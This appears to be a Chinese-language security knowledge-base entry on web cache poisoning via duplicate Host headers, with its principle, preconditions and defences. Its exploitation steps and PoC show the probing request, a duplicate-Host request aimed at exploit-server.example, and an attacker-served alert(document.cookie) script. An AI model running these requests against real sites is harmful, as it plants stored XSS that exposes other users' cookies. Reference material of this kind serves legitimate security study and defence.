---
id: web-generic-cache-poisoning-host-header-ambiguous-request
title: Host 头缓存投毒：重复 Host 让缓存响应引用攻击者脚本
type: scenario
domain: web
path: web/generic/cache-poisoning
technique: host-header-cache-poisoning
aliases:
- Host 缓存投毒
- 歧义请求缓存投毒
- Web cache poisoning via ambiguous requests
- 重复 Host 缓存
- Host 反射 XSS 缓存放大
tags:
- web
- cache-poisoning
- host-header
- ambiguous-request
- duplicate-header
- xss
- cdn
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V19
  verified_at: '2026-11-05T02:27:25+08:00'
  notes: 已对照原文核对；X-Cache miss/hit、Host反射到tracking.js、重复Host(首个合法/第二个攻击者)、exploit server返回alert并弹窗均一致；未复跑
---

## 一句话结论

当页面会把 `Host` 反射进 HTML/脚本 URL、而缓存键不包含 `Host` 时，用重复 `Host`（或绝对 URL 等歧义请求）让前端按合法 Host 路由、后端按攻击者 Host 生成响应，就能把引用攻击者脚本的页面缓存下来，对后续用户形成存储型 XSS。

## 原理

- 应用为了生成绝对 URL/静态资源地址，直接把请求 Host 拼进 HTML，例如 `<script src="//<host>/resources/js/tracking.js">`；Host 完全由客户端控制。
- 若响应被 CDN/应用缓存且缓存键只含路径与查询串、不含 Host，攻击者可以让一份“指向自己服务器脚本”的响应进入缓存，其他用户访问同一路径时收到被投毒页面，浏览器加载攻击者 JS。
- 歧义请求用于同时满足两个组件：前端需要合法 Host 才会路由/回源，后端又需要恶意 Host 才生成恶意 URL。重复 `Host` 头时，前端取第一个（合法），后端取最后一个（攻击者）；绝对 URL、缩进 Host 等也能制造同类解析差异。
- 单独反射 Host 通常只是自 XSS（受害者无法被强迫发错误 Host），但缓存把它变成可影响其他用户的存储型漏洞。

## 触发条件

- 页面把 Host（或 `X-Forwarded-Host`）反射到 HTML、脚本/样式 URL、跳转链接中。
- 响应可被缓存，且缓存键不含 Host；或 Host 未参与缓存键的规范化。
- 前端与后端对重复 Host、绝对 URL、缩进 Host 的取值优先级不一致。
- 攻击者能提供一个与反射路径匹配的恶意 JS 资源。

## 利用步骤

1. 找可缓存页面：观察响应是否有 `X-Cache: miss/hit`、`Age`、`Cache-Control`；用唯一查询参数（如 `?cb=123`）确认缓存命中。
2. 检查 Host 反射：把 Host 改为一个可识别的值（如 `orange`），看响应中的脚本/链接是否变成 `//orange/...`。
3. 让响应指向攻击者服务器：用重复 Host，第一个为合法域名保证路由，第二个为攻击者域名；或用绝对 URL + 恶意 Host 制造解析差异。
4. 在攻击者服务器上按反射路径提供恶意 JS（如 `/resources/js/tracking.js` 返回 `alert(document.cookie)`）。
5. 发送请求让恶意响应进入缓存（`X-Cache: hit`），再让受害者访问同一缓存键，脚本执行。
6. 若缓存键含查询参数，固定一个参数值并引导受害者访问带该参数的 URL。

## PoC

探测反射与缓存：

```http
GET /?cb=123 HTTP/1.1
Host: orange
```

响应中出现：

```html
<script src="//orange/resources/js/tracking.js"></script>
```

用重复 Host 投毒（前端取第一个、后端取最后一个）：

```http
GET /?cb=123 HTTP/1.1
Host: target.example
Host: exploit-server.example
```

缓存后的响应变为：

```html
<script src="//exploit-server.example/resources/js/tracking.js"></script>
```

攻击者服务器返回：

```
alert(document.cookie)
```

受害者访问 `https://target.example/?cb=123` 时从缓存取得该响应并执行脚本。原文通过 `X-Cache: hit` 与弹窗确认了链路。

## 变体与关联

- 变体：绝对 URL 请求行与 Host 不一致；缩进（前导空格）Host 被不同组件忽略/采纳；`X-Forwarded-Host` 覆盖头。
- 变体：反射进 `Link`、`Location`、`<base>`、CSS `url()`、JSONP 回调等，影响面随上下文变化。
- 关联：[[web-generic-auth-host-header-localhost-auth-bypass]]、[[web-generic-ssrf-host-header-routing-ssrf]]、[[web-generic-http-smuggling-host-connection-state-bypass]]。
- 关联：[[web-generic-cache-poisoning-web-cache-deception-url-normalization-mismatch]]（缓存键与归一化差异的另一类问题）。

## 检测与防御

- 缓存键纳入 Host（规范化后的完整主机名），或拒绝 Host 不一致的请求；对重复 Host、绝对 URL、缩进 Host 做规范化与拒绝。
- 生成绝对 URL 时使用固定配置的站点域名，不读取请求 Host；至少做严格 allowlist。
- 对 HTML 中的 URL 做转义与校验；设置 CSP 限制脚本源。
- 监控 `X-Cache` 命中率异常、Host 与实际站点不一致的缓存写入、页面中出现非本站脚本域名。
